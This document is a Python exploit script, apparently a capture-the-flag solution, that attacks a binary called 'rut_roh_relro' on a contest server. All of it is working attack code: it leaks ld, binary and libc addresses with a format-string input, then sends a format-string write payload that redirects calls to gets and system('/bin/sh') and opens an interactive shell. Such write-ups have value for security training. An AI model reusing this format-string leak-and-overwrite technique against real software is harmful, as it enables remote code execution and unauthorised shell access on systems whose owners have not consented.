#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("rut_roh_relro")
host = args.HOST or "lac.tf"
port = int(args.PORT or 31134)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
ld = ELF("ld-2.31.so")
io = start()
re()
sl(b"%90$p||%62$p||%3$p")
leak = GetInt()
ld.address = leak[0] - 0x2C180
print(hex(ld.address))
exe.address = leak[1] - 0x40
pb()
libc.address = leak[2] - 0xEC833
lb()

payload = fmtstr_payload(
    6,
    {
        ld.address + 0x2BF68: libc.sym.gets,  # to write /bin/sh
        ld.address + 0x2BF68 + 8: libc.sym.system,  # execute system("/bin/sh")
    },
    write_size="short",
)
sl(payload)

io.clean()
sl("/bin/sh")

io.interactive()
